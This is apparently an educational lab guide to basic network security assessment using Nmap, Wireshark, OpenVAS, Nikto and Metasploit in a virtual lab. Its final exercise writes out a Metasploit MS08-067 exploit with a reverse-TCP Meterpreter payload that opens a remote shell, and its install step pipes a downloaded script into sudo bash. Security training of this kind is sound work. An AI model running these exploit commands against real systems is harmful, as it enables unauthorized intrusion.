# Basic Network Security Assessment: Identifying Vulnerabilities in Network Configurations

## Introduction

Network security is a critical aspect of protecting an organization’s data and resources from unauthorized access and cyber threats. 
This project guides you through a basic network security assessment, focusing on identifying common vulnerabilities in network configurations. 
You’ll use a variety of tools to scan, analyze, and secure your network.

Pre-requisites

To successfully complete this project, you should have:

    A basic understanding of networking concepts (IP addresses, subnets, routers, etc.).
    Familiarity with the Linux command line.
    A computer with a Linux operating system (preferably Ubuntu).
    An internet connection to download necessary tools.

Lab Setup and Tools

Lab Environment:

    Create a virtualized network setup using VirtualBox or VMware.
    Use at least two virtual machines: one as the target system and one as the attacker.

Required Tools:

    Nmap
    Wireshark
    OpenVAS
    Nikto
    Metasploit


Exercises:


Exercise 1: Network Scanning with Nmap

Objective: Identify live hosts and open ports on the target network.

Steps:
1. Install Nmap:

  sudo apt-get update
  sudo apt-get install nmap

2. Scan the Network:

  nmap -sn 192.168.1.0/24  

This command performs a ping scan to identify live hosts.


3. Identify Open Ports:

nmap -sS 192.168.1.10  

Replace 192.168.1.10 with the IP address of a live host from the previous step.


Expected Output:
-A list of live hosts in the network.
-Open ports on the specified host.


Exercise 2: Traffic Analysis with Wireshark

Objective: Capture and analyze network traffic to identify potential security issues.

Steps:
1. Install Wireshark:

  sudo apt-get install wireshark  


2. Capture Network Traffic:
  - Open Wireshark.
  - Select the network interface to capture traffic.
  - Click the "Start" button to begin capturing packets


3. Analyze Captured Traffic:
  - Look for suspicious activity such as repeated requests, unusual protocols, or large data transfers.


Expected Output:
- A capture file containing network traffic data.
- Identification of any suspicious traffic patterns.



Exercise 3: Vulnerability Scanning with OpenVAS

Objective: Perform a vulnerability scan on the target network to identify known vulnerabilities.


Steps:
1. Install OpenVAS:


    sudo apt-get install openvas  
    sudo openvas-setup 


2. Configure and Start OpenVAS:
  - Access the OpenVAS web interface (typically at https://localhost:9392).
  - Log in with the admin credentials created during setup.


3. Run a Vulnerability Scan:
  - Create a new scan task.
  - Set the target IP address range.
  - Start the scan and wait for it to complete.

Expected Output:
-A report detailing identified vulnerabilities and their severity.



Exercise 4: Web Server Assessment with Nikto

Objective: Assess a web server for common vulnerabilities using Nikto.


Steps:
1. Install Nikto:

    sudo apt-get install nikto 


2. Scan the Web Server:

    nikto -h http://192.168.1.10  


Replace 192.168.1.10 with the target web server’s IP address.


Expected Output:
-A report detailing potential vulnerabilities, misconfigurations, and other issues with the web server.



Exercise 5: Exploitation Testing with Metasploit


Objective: Use Metasploit to exploit a vulnerability identified in previous exercises.

Steps:
1. Install Metasploit:

    curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/scripts/msfupdate | sudo bash  


2. Launch Metasploit Console:

  msfconsole  


3. Select and Configure an Exploit:

  use exploit/windows/smb/ms08_067_netapi  
  set RHOST 192.168.1.10  
  set PAYLOAD windows/meterpreter/reverse_tcp  
  set LHOST 192.168.1.20  
  run  

Replace 192.168.1.10 with the target IP address.
Replace 192.168.1.20 with the attacker’s IP address.


Expected Output:
-Successful exploitation opens a Meterpreter session on the target machine.



Conclusion

By completing these exercises, you have gained hands-on experience in identifying and assessing common network security vulnerabilities using various tools. 
This foundational knowledge sets the stage for more advanced security assessments and helps you strengthen network infrastructures.
